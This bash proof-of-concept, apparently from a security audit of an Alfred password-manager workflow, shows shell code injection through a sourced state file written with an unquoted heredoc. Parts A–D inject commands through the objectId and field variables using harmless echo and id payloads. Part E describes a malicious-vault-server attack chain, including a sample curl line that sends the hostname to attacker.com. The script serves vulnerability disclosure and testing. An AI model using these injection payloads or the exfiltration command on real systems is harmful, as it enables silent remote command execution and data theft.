#!/bin/bash
# ============================================================
# PoC #9 — Shell Code Injection via Sourced FETCH_FILE (HIGH)
# Vulnerability: lib/utils.sh:48–59
#
# saveSelection() writes an unquoted heredoc to FETCH_FILE:
#
#   cat > "${FETCH_FILE}" << EOF
#   LAST_FETCH=${NOW}
#   old_objectId=${objectId}
#   old_field=${field}
#   EOF
#
# getSelection() then SOURCES this file:
#
#   [ -f "${FETCH_FILE}" ] && . "${FETCH_FILE}"
#
# Because the heredoc delimiter is unquoted (EOF not 'EOF'), bash
# expands $() and `` in ${objectId} and ${field} at write time.
# But more critically, if these variables contain newlines or shell
# metacharacters, the written file contains extra shell statements
# that execute when sourced.
#
# This PoC demonstrates:
#   A) Normal saveSelection / getSelection cycle (baseline)
#   B) objectId with a command substitution embedded (write-time expansion)
#   C) objectId with a newline injecting a new shell command (source-time RCE)
#   D) field variable injection
#   E) A realistic attack scenario via a compromised vault server
# ============================================================

# Set up a temp environment
TMPDIR_POC=$(mktemp -d)
FETCH_FILE="${TMPDIR_POC}/last_item"
TIMER_FILE="${TMPDIR_POC}/timer"
NOW=$(date +%s)

EXFIL_FILE="${TMPDIR_POC}/rce_proof.txt"

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }

# Reproduce saveSelection() from utils.sh verbatim
saveSelection() {
    cat > "${FETCH_FILE}" << EOF
LAST_FETCH=${NOW}
old_objectId=${objectId}
old_field=${field}
EOF
}

# Reproduce getSelection() from utils.sh verbatim
getSelection() {
    LAST_FETCH=0
    [ -f "${FETCH_FILE}" ] && . "${FETCH_FILE}"
}

# ---------- Part A: Baseline ----------
banner "Part A — Baseline: normal UUID objectId"

objectId="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
field="password"
saveSelection

echo "[*] FETCH_FILE contents:"
cat -A "${FETCH_FILE}"
echo

getSelection
echo "[*] After getSelection:"
echo "    old_objectId = ${old_objectId}"
echo "    old_field    = ${old_field}"
ok "Normal operation: no injection."

# ---------- Part B: Write-time command substitution expansion ----------
banner "Part B — Write-time expansion via command substitution in objectId"

unset old_objectId old_field

# An unquoted heredoc expands $() at write time (when saveSelection runs).
# The command runs immediately during saveSelection() — before sourcing.
objectId='$(echo CMD_AT_WRITE_TIME > '"${TMPDIR_POC}"'/writetime_rce.txt)'
field="username"
saveSelection

echo "[*] FETCH_FILE contents:"
cat -A "${FETCH_FILE}"
echo

if [ -f "${TMPDIR_POC}/writetime_rce.txt" ]; then
    ok "CONFIRMED: Command substitution in objectId executed at WRITE TIME"
    ok "  (during saveSelection, before any sourcing occurs)."
    ok "  Contents: $(cat "${TMPDIR_POC}/writetime_rce.txt")"
else
    info "Write-time expansion not triggered (shell may have quoted heredoc)."
fi

# ---------- Part C: Source-time RCE via newline injection ----------
banner "Part C — Source-time RCE via newline in objectId"

unset old_objectId old_field
rm -f "${EXFIL_FILE}"

# A literal newline in objectId breaks the variable assignment into two lines.
# The second line is a separate shell statement executed when the file is sourced.
objectId="$(printf 'legitimate-uuid-0001\necho RCE_VIA_SOURCE > %s' "${EXFIL_FILE}")"
field="password"

echo "[*] objectId contains a newline — saving..."
saveSelection

echo "[*] FETCH_FILE contents (cat -A shows $ at end of each line):"
cat -A "${FETCH_FILE}"
echo

echo "[*] Sourcing FETCH_FILE (simulates getSelection)..."
getSelection

if [ -f "${EXFIL_FILE}" ]; then
    ok "CONFIRMED: Injected shell command executed at SOURCE TIME (getSelection)."
    ok "  Exfil file contents: $(cat "${EXFIL_FILE}")"
    ok "  old_objectId = ${old_objectId}"
else
    info "Source-time RCE not triggered.  Check if newline was preserved."
fi

# ---------- Part D: field variable injection ----------
banner "Part D — Shell injection via 'field' variable"

unset old_objectId old_field
EXFIL_FIELD="${TMPDIR_POC}/field_rce.txt"

# The 'field' variable normally holds values like "password", "username", "totp".
# It is set by Alfred workflow variables (user-configurable in info.plist).
field="$(printf 'totp\nid > %s' "${EXFIL_FIELD}")"
objectId="aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"

saveSelection

echo "[*] FETCH_FILE contents:"
cat -A "${FETCH_FILE}"
echo

getSelection

if [ -f "${EXFIL_FIELD}" ]; then
    ok "CONFIRMED: 'field' variable injection also achieves RCE."
    ok "  Contents: $(cat "${EXFIL_FIELD}")"
else
    info "Field injection not triggered in this environment."
fi

# ---------- Part E: Realistic attack scenario ----------
banner "Part E — Realistic attack scenario via compromised vault server"

echo "Attack chain:"
echo
echo "  1. Attacker sets up a malicious Bitwarden-compatible server."
echo "  2. Victim changes serverUrl to point to the malicious server"
echo "     (social engineering, supply-chain, or workflow modification)."
echo "  3. The malicious server returns vault items with crafted 'id' fields"
echo "     containing newline-injected shell commands."
echo "  4. When the victim selects an item in Alfred, saveSelection() is called:"
echo
echo "       objectId='<malicious-id-from-server>'"
echo "       # id = \"real-uuid\\ncurl http://attacker.com/steal?host=\$(hostname)\""
echo
echo "  5. On the NEXT Alfred invocation (any bw keyword use), getSelection()"
echo "     sources the file — executing the injected command."
echo
echo "  Impact: arbitrary command execution as the macOS user, without any"
echo "  further interaction beyond using the Alfred workflow normally."
echo
echo "  This attack is fully silent — the victim sees normal workflow behavior."

# ---------- Cleanup ----------
banner "Cleanup"
rm -rf "${TMPDIR_POC}"
ok "Temp files removed."
